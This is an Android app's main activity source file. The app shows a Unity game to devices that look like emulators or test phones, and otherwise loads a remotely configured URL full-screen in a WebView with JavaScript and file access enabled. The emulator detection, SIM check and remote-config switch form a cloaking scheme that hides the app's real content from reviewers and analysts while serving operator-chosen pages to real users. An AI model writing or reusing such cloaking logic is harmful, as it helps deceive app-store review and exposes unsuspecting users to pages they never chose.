package com.ZerostaR.hello;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.StatusBarManager;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.nfc.Tag;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;

import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseException;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.unity3d.player.UnityPlayerActivity;


public class MainActivity extends AppCompatActivity {

    WebView myWebView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        String filename = "url_storage.json";
        String TAG = "MainActivity";
        String url;
        ImageView errorImageView;
        LinearLayout errorLinearLayout;
        setContentView(R.layout.activity_main);

        myWebView = (WebView) findViewById(R.id.webview);


        //enabling DOM and JavaScript adding some support in java
        WebSettings webSettings = myWebView.getSettings();

        webSettings.setDomStorageEnabled(true);
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);
        webSettings.setSupportZoom(false);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);

        //Hiding error messages
        errorImageView = findViewById(R.id.imageView);
        errorImageView.setVisibility(View.GONE);
        errorLinearLayout = findViewById(R.id.linearLayout);
        errorLinearLayout.setVisibility(View.GONE);

        HideActionBar();//Status bar and view change left

        //Button
        Button btn1 = (Button) findViewById(R.id.button);
        btn1.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {//Exit on error
                finish();
                System.exit(0);
            }});



        //File checking for saved url
        boolean fileIsPresent = isFilePresent(this,filename);
        if(!fileIsPresent)
        {
            Log.i(TAG,"No file found");
            try {
                url = RemoteConfigGetData();
            }
            catch(Exception e)
            {
                url = "";
                Log.i(TAG,e.toString());
            }

            if(url.equals("") || isEmulator() || isSIMExists())
            {
                Log.i(TAG,"OpenUnityGame");
                OpenUnityGame();

            }
            else
            {
                Log.i(TAG,"Save URL link");
                create(this,filename,url);
                // Hide the status bar.

                myWebView.loadUrl(url);
                HideActionBar();
            }

        }
        else
        {
            url = read(this,filename);
            if(hasConnection(this))
            {
                Log.i(TAG,"Load WebView");
                myWebView.loadUrl(url);
                HideActionBar();
            }
            else
            {
                Log.i(TAG,"ConnectionRequired");
                myWebView.setVisibility(View.GONE);
                errorImageView.setVisibility(View.VISIBLE);
                errorLinearLayout.setVisibility(View.VISIBLE);
            }
        }

    }
    private void OpenUnityGame()
    {
        Intent i = new Intent(this, UnityPlayerActivity.class);
        startActivity(i);
        finish();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            switch (keyCode) {
                case KeyEvent.KEYCODE_BACK:
                    if (myWebView.canGoBack()) {
                        myWebView.goBack();
                    } else {
                      //Nothing happens)
                    }
                    return true;
            }

        }
        return super.onKeyDown(keyCode, event);
    }
    public boolean isSIMExists()
    {
        TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int simState = telMgr.getSimState();
        switch (simState) {
            case TelephonyManager.SIM_STATE_ABSENT:
                return false;
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                return false;
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                return false;
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                return false;
            case TelephonyManager.SIM_STATE_READY:
                return true;
            case TelephonyManager.SIM_STATE_UNKNOWN:
                return false;
            default:
                return false;

        }
    }

    private void HideActionBar()
    {
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }

    }
    public boolean isEmulator() {//is emulator ?
        if (BuildConfig.DEBUG) return false;//For debugging
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        /*
        String phoneModel = Build.MODEL;
        String brand = Build.BRAND;
*/
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || Build.SERIAL.contains("unknown")
                || buildHardware == "vbox86"
                || "google_sdk".equals(Build.PRODUCT)
                || buildProduct == "vbox86p";
                /*
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox");
*/

    }


    private String RemoteConfigGetData()
    {
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            /*
                            boolean updated = task.getResult();

                            Toast.makeText(MainActivity.this, "Fetch and activate succeeded",
                                    Toast.LENGTH_SHORT).show();
*/

                        } else {
                            /*
                            Toast.makeText(MainActivity.this, "Fetch failed",
                                    Toast.LENGTH_SHORT).show();
                                    */

                        }

                    }
                });
       return mFirebaseRemoteConfig.getString("url");

    }

    private String read(Context context, String fileName) {
        try {
            FileInputStream fis = context.openFileInput(fileName);
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader bufferedReader = new BufferedReader(isr);
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
            }
            return sb.toString();
        } catch (FileNotFoundException fileNotFound) {
            return null;
        } catch (IOException ioException) {
            return null;
        }
    }

    private void Hide(View view)
    {

    }
    private boolean create(Context context, String fileName, String jsonString){
        String FILENAME = "url_storage.json";
        try {
            FileOutputStream fos = context.openFileOutput(fileName,Context.MODE_PRIVATE);
            if (jsonString != null) {
                fos.write(jsonString.getBytes());
            }
            fos.close();
            return true;
        } catch (FileNotFoundException fileNotFound) {
            return false;
        } catch (IOException ioException) {
            return false;
        }

    }

    public boolean isFilePresent(Context context, String fileName) {
        String path = context.getFilesDir().getAbsolutePath() + "/" + fileName;
        File file = new File(path);
        return file.exists();
    }

    public static boolean hasConnection(final Context context)
    {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getActiveNetworkInfo();
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        return false;
    }

}